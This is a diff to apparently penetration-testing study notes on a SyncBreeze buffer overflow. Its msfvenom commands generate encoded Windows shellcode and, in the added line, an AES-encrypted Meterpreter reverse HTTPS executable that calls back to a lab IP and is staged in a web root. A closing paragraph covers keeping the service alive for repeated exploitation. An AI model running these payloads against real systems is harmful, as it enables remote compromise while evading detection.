@@ -17,6 +17,8 @@ msfvenom -a x86 -p windows/exec cmd=cmd.exe -e x86/shikata_ga_nai -f c -n 10 -b 
 
 msfvenom -a x86 -p windows/exec cmd=cmd.exe -e x86/shikata_ga_nai -f raw -n 10 -b "\x00\x0a\x0d"(non-network-based command execution payloads)(it has no service handles the string to raw bytes conversion)  
 
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o /var/www/html/met64_aes.exe  
+
 ### Improving the Exploit
 > The default exit method of Metasploit shellcode following its execution is the ExitProcess API. This exit method will shut down the whole web service process when the reverse shell is terminated, effectively killing the SyncBreeze service and causing it to crash.
 If the program we are exploiting is a threaded application, and in this case it is, we can try to avoid crashing the service completely by using the ExitThread API instead, which will only terminate the affected thread of the program. This will make our exploit work without interrupting the usual operation of the SyncBreeze server, and will allow us to repeatedly exploit the server and exit the shell without bringing down the service.
